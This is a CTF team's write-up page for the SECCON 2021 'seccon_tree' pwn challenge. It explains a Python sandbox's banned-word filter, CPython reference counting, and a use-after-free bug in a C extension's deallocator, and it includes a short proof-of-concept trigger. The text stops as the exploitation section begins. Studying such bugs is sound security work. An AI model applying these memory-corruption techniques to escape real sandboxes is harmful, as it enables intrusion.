@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>seccon_tree | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="seccon_tree" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/SECCON-2021/pwn/seccon_tree.html" />
+<meta property="og:url" content="https://org.anize.rs/SECCON-2021/pwn/seccon_tree.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="seccon_tree" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"seccon_tree","url":"https://org.anize.rs/SECCON-2021/pwn/seccon_tree.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="seccon_tree">seccon_tree</h1>
+
+<p><strong>Author</strong>: pql</p>
+
+<p><strong>Tags</strong>: pwn, python, module, sandbox</p>
+
+<p><strong>Points</strong>: 393 (4 solves)</p>
+
+<blockquote>
+  <p>Let’s make your own tree! nc seccon-tree.quals.seccon.jp 30001</p>
+</blockquote>
+
+<h2 id="the-challenge">The challenge</h2>
+<p>We’re given an archive containing a Dockerfile, a python <a href="https://docs.python.org/3/extending/extending.html">C Extension Module</a> along with its source, and a small python server that listens on a port and executes semi-arbitrary code after performing some checks.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>seccon_tree
+├── Dockerfile
+├── env
+│   ├── banned_word
+│   ├── run.py
+│   ├── seccon_tree.cpython-39-x86_64-linux-gnu.so
+│   └── template.py
+├── flag
+└── src
+    ├── lib.c
+    └── setup.py
+</code></pre></div></div>
+
+<p>Additionally, we’re given an example on how to use the provided extension module:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Here is an example.
+</span>
+<span class="kn">from</span> <span class="nn">seccon_tree</span> <span class="kn">import</span> <span class="n">Tree</span>
+
+<span class="n">cat</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">"cat"</span><span class="p">)</span>
+<span class="n">lion</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">"lion"</span><span class="p">)</span>
+<span class="n">tiger</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">"tiger"</span><span class="p">)</span>
+
+<span class="n">cat</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">lion</span><span class="p">)</span>
+<span class="n">cat</span><span class="p">.</span><span class="n">add_child_right</span><span class="p">(</span><span class="n">tiger</span><span class="p">)</span>
+
+<span class="k">assert</span><span class="p">(</span><span class="n">cat</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"lion"</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">)</span>
+<span class="k">assert</span><span class="p">(</span><span class="n">lion</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"tiger"</span><span class="p">)</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Ok, so nothing special here. The extension module just implements a binary tree structure, and assumedly we have to exploit it (as the challenge is marked <code class="language-plaintext highlighter-rouge">pwn</code>). As mentioned, we can execute semi-arbitrary code on the server. It might be a good idea to look at what constraints are imposed on us (maybe we can cheese it!):</p>
+
+<p>Looking at <code class="language-plaintext highlighter-rouge">run.py</code>, our code is inserted into a template (<code class="language-plaintext highlighter-rouge">/** code **/</code> is replaced with our input):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">seccon_tree</span> <span class="kn">import</span> <span class="n">Tree</span>
+
+<span class="c1"># Debug utility
+</span><span class="n">seccon_print</span> <span class="o">=</span> <span class="k">print</span>
+<span class="n">seccon_bytes</span> <span class="o">=</span> <span class="nb">bytes</span>
+<span class="n">seccon_id</span> <span class="o">=</span> <span class="nb">id</span>
+<span class="n">seccon_range</span> <span class="o">=</span> <span class="nb">range</span>
+<span class="n">seccon_hex</span> <span class="o">=</span> <span class="nb">hex</span>
+<span class="n">seccon_bytearray</span> <span class="o">=</span> <span class="nb">bytearray</span>
+<span class="k">class</span> <span class="nc">seccon_util</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">Print</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">l</span><span class="p">):</span>
+        <span class="n">seccon_print</span><span class="p">(</span><span class="o">*</span><span class="n">l</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">Bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">o</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">seccon_bytes</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">Id</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">o</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">seccon_id</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">Range</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">l</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">seccon_range</span><span class="p">(</span><span class="o">*</span><span class="n">l</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">Hex</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">o</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">seccon_hex</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">Bytearray</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">o</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">seccon_bytearray</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+
+<span class="n">dbg</span> <span class="o">=</span> <span class="n">seccon_util</span><span class="p">()</span>
+
+<span class="c1"># Disallow everything
+</span><span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">):</span>
+    <span class="k">del</span> <span class="n">__builtins__</span><span class="p">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">key</span><span class="p">]</span>
+<span class="k">del</span> <span class="n">__builtins__</span>
+
+
+<span class="o">/**</span> <span class="n">code</span> <span class="o">**/</span>
+
+</code></pre></div></div>
+
+<p>Furthermore, a list of banned strings is provided: if any of these strings occur in our supplied payload code, it is rejected.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>attr,base,breakpoint,builtins,code,debug,dict,eval,exec,frame,global,import,input,loader,locals,memoryview,module,mro,open,os,package,raise,read,seccon,spec,sub,super,sys,system,type,vars,write
+</code></pre></div></div>
+
+<p>Ouch, that’s quite an exhaustive list! In combination with all of <code class="language-plaintext highlighter-rouge">__builtins__</code> being removed, this doesn’t leave much room for cheese. Ergo, exploiting the module itself it is. Before starting exploitation, we grab the <code class="language-plaintext highlighter-rouge">python3.9</code> executable as well as its debug files from the docker container and merge them together:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker <span class="nb">cp </span>seccon_pwn:/usr/bin/python3.9 ./
+docker <span class="nb">cp </span>seccon_pwn:/usr/lib/debug/.build-id/00/e6cc236dd0e3107072f45b03325ebc736013fa.debug
+eu-unstrip ./python3.9 e6cc236dd0e3107072f45b03325ebc736013fa.debug
+</code></pre></div></div>
+
+<p>This is going to make debugging a lot easier. We can now get full type info in gdb, which allows for detailed stack traces and pretty-printing of structures.</p>
+
+<h1 id="a-primer-on-cpython">A primer on CPython</h1>
+
+<p>Everything in python is an object. There is no concept of ‘primitive types’ like in Java, C++, or PHP. Even types themselves are objects! In CPython, all of these objects are allocated on the heap, using the default system allocator (<code class="language-plaintext highlighter-rouge">ptmalloc2</code> on linux).</p>
+
+<p>An object can be referenced generically with a <code class="language-plaintext highlighter-rouge">PyObject*</code> pointer. Every CPython object has a <code class="language-plaintext highlighter-rouge">PyObject</code> at the beginning, which contains a reference count and a <code class="language-plaintext highlighter-rouge">PyTypeObject*</code> pointer describing the type of the object. The <code class="language-plaintext highlighter-rouge">PyObject*</code> pointer has to be cast to a more complete subtype to access any additional fields in the structure. This is reminiscent of the object model in languages like C++, except implemented manually.</p>
+
+<p>A <code class="language-plaintext highlighter-rouge">PyTypeObject</code> corresponds to a <code class="language-plaintext highlighter-rouge">type</code> in python and is an object in itself. This object contains things like:</p>
+
+<ul>
+  <li>The type name.</li>
+  <li>The size of objects of this type.</li>
+  <li>“Special” function pointers for native implementations of <code class="language-plaintext highlighter-rouge">__repr__</code>, <code class="language-plaintext highlighter-rouge">__str__</code>, <code class="language-plaintext highlighter-rouge">__hash__</code>  etc.</li>
+  <li>Docstring for objects of this type.</li>
+  <li>Methods and members for objects of this type.</li>
+  <li>(De)allocation, deletion and initialization function pointers.</li>
+</ul>
+
+<p>The reference count inside of <code class="language-plaintext highlighter-rouge">PyObject</code> is a 64 bit unsigned integer used for memory management. Every time an object gains a reference (for example by assigning it to a different variable) the reference count is incremented, and every time it loses a reference (for example, when <code class="language-plaintext highlighter-rouge">del</code> is used or a variable goes out of scope) the reference count is decremented.</p>
+
+<p>When the reference count reaches zero, the object is destroyed immediately. Optionally some specific destruction code can be ran before the object is freed and released to the allocator again.</p>
+
+<p>Note that this is a very primitive garbage collection algorithm compared to runtimes like Java and Go. Objects are simply freed on the main thread directly when the reference count reaches zero. For our purposes this is a good thing, as this makes it a lot less painful to exploit memory management bugs.</p>
+
+<h1 id="finding-the-bug">Finding the bug</h1>
+
+<p>So, looking at the module extension source, it declares a new type <code class="language-plaintext highlighter-rouge">seccon_tree.Tree</code>, which is defined as follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">PyTypeObject</span> <span class="n">TreeType</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">PyObject_HEAD</span>
+    <span class="n">PyObject</span> <span class="o">*</span><span class="n">object</span><span class="p">;</span>
+    <span class="n">PyObject</span> <span class="o">*</span><span class="n">left</span><span class="p">;</span>
+    <span class="n">PyObject</span> <span class="o">*</span><span class="n">right</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Tree</span><span class="p">;</span>
+
+<span class="k">static</span> <span class="n">PyMethodDef</span> <span class="n">TreeMethods</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">{</span><span class="s">"find"</span><span class="p">,</span> <span class="p">(</span><span class="n">PyCFunction</span><span class="p">)</span><span class="n">find_node</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"tree: find"</span><span class="p">},</span>
+    <span class="p">{</span><span class="s">"get_object"</span><span class="p">,</span> <span class="p">(</span><span class="n">PyCFunction</span><span class="p">)</span><span class="n">get_object</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"tree: get_object"</span><span class="p">},</span>
+    <span class="p">{</span><span class="s">"get_child_left"</span><span class="p">,</span> <span class="p">(</span><span class="n">PyCFunction</span><span class="p">)</span><span class="n">get_child_left</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"tree: get_child_left"</span><span class="p">},</span>
+    <span class="p">{</span><span class="s">"get_child_right"</span><span class="p">,</span> <span class="p">(</span><span class="n">PyCFunction</span><span class="p">)</span><span class="n">get_child_right</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"tree: get_child_right"</span><span class="p">},</span>
+    <span class="p">{</span><span class="s">"add_child_left"</span><span class="p">,</span> <span class="p">(</span><span class="n">PyCFunction</span><span class="p">)</span><span class="n">add_child_left</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"tree: add_child_left"</span><span class="p">},</span>
+    <span class="p">{</span><span class="s">"add_child_right"</span><span class="p">,</span> <span class="p">(</span><span class="n">PyCFunction</span><span class="p">)</span><span class="n">add_child_right</span><span class="p">,</span> <span class="n">METH_VARARGS</span><span class="p">,</span> <span class="s">"tree: add_child_right"</span><span class="p">},</span>
+    <span class="p">{</span><span class="nb">NULL</span><span class="p">}</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="n">PyTypeObject</span> <span class="n">TreeType</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="s">"seccon_tree.Tree"</span><span class="p">,</span>             <span class="cm">/* tp_name */</span>
+    <span class="k">sizeof</span><span class="p">(</span><span class="n">Tree</span><span class="p">),</span>                   <span class="cm">/* tp_basicsize */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_itemsize */</span>
+    <span class="p">(</span><span class="n">destructor</span><span class="p">)</span><span class="n">Tree_dealloc</span><span class="p">,</span>       <span class="cm">/* tp_dealloc */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_print */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_getattr */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_setattr */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_reserved */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_repr */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_as_number */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_as_sequence */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_as_mapping */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_hash */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_call */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_str */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_getattro */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_setattro */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_as_buffer */</span>
+    <span class="n">Py_TPFLAGS_DEFAULT</span><span class="p">,</span>             <span class="cm">/* tp_flags */</span>
+    <span class="s">"my tree"</span><span class="p">,</span>                      <span class="cm">/* tp_doc */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_traverse */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_clear */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_richcompare */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_weaklistoffset */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_iter */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_iternext */</span>
+    <span class="n">TreeMethods</span><span class="p">,</span>                    <span class="cm">/* tp_methods */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_members */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_getset */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_base */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_dict */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_descr_get */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_descr_set */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_dictoffset */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_init */</span>
+    <span class="mi">0</span><span class="p">,</span>                              <span class="cm">/* tp_alloc */</span>
+    <span class="n">Tree_new</span><span class="p">,</span>                       <span class="cm">/* tp_new */</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>So, the <code class="language-plaintext highlighter-rouge">Tree</code> object simply represents a node in a binary tree, with a left reference, a right reference and an inner object. Even though <code class="language-plaintext highlighter-rouge">left</code> and <code class="language-plaintext highlighter-rouge">right</code> are declared as <code class="language-plaintext highlighter-rouge">PyObject*</code> in the <code class="language-plaintext highlighter-rouge">Tree</code> struct, these fields can effectively only be set to another <code class="language-plaintext highlighter-rouge">Tree</code> object. A summary of the declared methods:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">get_child_left</code>, <code class="language-plaintext highlighter-rouge">get_child_right</code> fetch the <code class="language-plaintext highlighter-rouge">left</code> and respectively <code class="language-plaintext highlighter-rouge">right</code>  fields of the <code class="language-plaintext highlighter-rouge">Tree</code> and return it after increasing their reference counts.</li>
+  <li><code class="language-plaintext highlighter-rouge">add_child_left</code>, <code class="language-plaintext highlighter-rouge">add_child_right</code> set the <code class="language-plaintext highlighter-rouge">left</code> and respectively <code class="language-plaintext highlighter-rouge">right</code> fields of the <code class="language-plaintext highlighter-rouge">Tree</code> to the supplied <code class="language-plaintext highlighter-rouge">Tree</code> after increasing its reference count.</li>
+  <li><code class="language-plaintext highlighter-rouge">get_object</code> returns the <code class="language-plaintext highlighter-rouge">object</code> field of the <code class="language-plaintext highlighter-rouge">Tree</code> after increasing its reference count.</li>
+  <li><code class="language-plaintext highlighter-rouge">find</code> traverses the <code class="language-plaintext highlighter-rouge">Tree</code> and tries to compare the <code class="language-plaintext highlighter-rouge">object</code> fields to the supplied object via <code class="language-plaintext highlighter-rouge">repr</code>. It returns the matching <code class="language-plaintext highlighter-rouge">Tree</code> (after increasing its reference count) on match or <code class="language-plaintext highlighter-rouge">None</code> if no match was found.</li>
+  <li><code class="language-plaintext highlighter-rouge">Tree_new</code> acts as allocator and initializer of the <code class="language-plaintext highlighter-rouge">Tree</code> in one, allocating memory for the object and setting its <code class="language-plaintext highlighter-rouge">object</code> field to the supplied argument.
+    <ul>
+      <li>Normally this functionality is split up between <code class="language-plaintext highlighter-rouge">__new__</code> and <code class="language-plaintext highlighter-rouge">__init__</code> but this object seems to implement it in a single method, I am not sure if this is conventional or not.</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Tree_dealloc</code> is calle whenever the reference count of the <code class="language-plaintext highlighter-rouge">Tree</code> drops to zero and frees the <code class="language-plaintext highlighter-rouge">Tree</code> struct.</li>
+</ul>
+
+<p>It’s interesting to note that the fields of the <code class="language-plaintext highlighter-rouge">Tree</code> struct are not exposed as members, so expressions like <code class="language-plaintext highlighter-rouge">tree.object</code> will not work.</p>
+
+<p>After some manual review, I found a bug in <code class="language-plaintext highlighter-rouge">Tree_dealloc</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
+<span class="nf">Tree_dealloc</span><span class="p">(</span><span class="n">Tree</span> <span class="o">*</span><span class="n">self</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">);</span>
+    <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">);</span>
+    <span class="n">Py_XDECREF</span><span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">object</span><span class="p">);</span>
+
+    <span class="n">Py_TYPE</span><span class="p">(</span><span class="n">self</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">tp_free</span><span class="p">((</span><span class="n">PyObject</span> <span class="o">*</span><span class="p">)</span> <span class="n">self</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Decrementing refcounts in deallocation functions in this manner is unsafe. If <code class="language-plaintext highlighter-rouge">self-&gt;object</code> has a reference count of one and implements a custom <code class="language-plaintext highlighter-rouge">__del__</code> method, this method is potentially still able to reference its associated <code class="language-plaintext highlighter-rouge">Tree</code> container, even though it will be unconditionally freed after. This can lead to a classic use-after-free condition, and optionally this can be converted to a double free.</p>
+
+<p>To properly exploit this, we should take a look at the <code class="language-plaintext highlighter-rouge">add_child_left</code> (or right) method:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">PyObject</span><span class="o">*</span>
+<span class="nf">add_child_left</span><span class="p">(</span><span class="n">Tree</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">PyObject</span> <span class="o">*</span><span class="n">obj</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyArg_ParseTuple</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">"O!"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TreeType</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">obj</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">left</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">self</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
+    <span class="n">self</span><span class="o">-&gt;</span><span class="n">left</span> <span class="o">=</span> <span class="n">obj</span><span class="p">;</span>
+
+    <span class="n">Py_RETURN_NONE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If the <code class="language-plaintext highlighter-rouge">left</code> field is replaced with another <code class="language-plaintext highlighter-rouge">Tree</code>, the old <code class="language-plaintext highlighter-rouge">Tree</code>’s reference count is decremented, triggering <code class="language-plaintext highlighter-rouge">Tree_dealloc</code> if this was the only reference. <code class="language-plaintext highlighter-rouge">Tree_dealloc</code> will in turn decrement the old <code class="language-plaintext highlighter-rouge">Tree</code>’s <code class="language-plaintext highlighter-rouge">object</code> field reference count, which can trigger a custom <code class="language-plaintext highlighter-rouge">__del__</code> method. This method can then call <code class="language-plaintext highlighter-rouge">get_child_left</code> on the root <code class="language-plaintext highlighter-rouge">Tree</code>, which will increment the reference counter again, but since we’re still in <code class="language-plaintext highlighter-rouge">Tree_dealloc</code>, the <code class="language-plaintext highlighter-rouge">Tree</code> will be freed. If we save the result of <code class="language-plaintext highlighter-rouge">get_child_left</code> to a global state we get a handle to a freed object. If we do not, the reference counter will decrease again after the object goes out of scope and we’re left with a double free after <code class="language-plaintext highlighter-rouge">Tree_dealloc</code> gets called again.</p>
+
+<p>So, a basic proof of concept for the user-after-free would be:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">seccon_tree</span> <span class="kn">import</span> <span class="n">Tree</span>
+
+<span class="n">root</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span>
+
+<span class="n">dangling_ref</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">class</span> <span class="nc">Pwn</span><span class="p">:</span>
+    
+    <span class="k">def</span> <span class="nf">__del__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">dangling_ref</span>
+        <span class="n">dangling_ref</span> <span class="o">=</span> <span class="n">root</span><span class="p">.</span><span class="n">get_child_left</span><span class="p">()</span>
+        
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">():</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="n">Pwn</span><span class="p">()))</span>
+    
+    <span class="c1"># Drop refcount of Pwn object, triggering destruction
+</span>    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+<span class="n">trigger</span><span class="p">()</span>
+
+<span class="n">new_ref</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">new_ref</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Executing this in the docker container yields:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@c19c5a5d3718:/exp<span class="nv">$ </span>./python3.9x poc.py 
+&lt;seccon_tree.Tree object at 0x7f588df83f60&gt;
+&lt;seccon_tree.Tree object at 0x7f588df83f60&gt;
+</code></pre></div></div>
+
+<p>This scenario is not very exciting in itself, since the only thing we’ve turned the UAF into is a <code class="language-plaintext highlighter-rouge">Tree</code> with two references but an actual reference count of one, but demonstrates the vulnerability.</p>
+
+<p>Funnily enough, this apparently was not the intended bug! After the competition ended, the author revealed that the intended bug was actually in <code class="language-plaintext highlighter-rouge">find</code>: the comparison with <code class="language-plaintext highlighter-rouge">repr</code> would allow a malicious object to implement a <code class="language-plaintext highlighter-rouge">__repr__</code> method that would replace a node in the tree, causing an use-after-free as well. I assume that exploitation would be mostly the same after this point, as these are quite similar scenarios.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>I chose to first implement a standalone exploit that doesn’t concern itself with the sandboxed environment as it saves us a great deal of pain, both implementation wise and debugging wise. Luckily the exploit worked in the sandbox without major changes.</p>
+
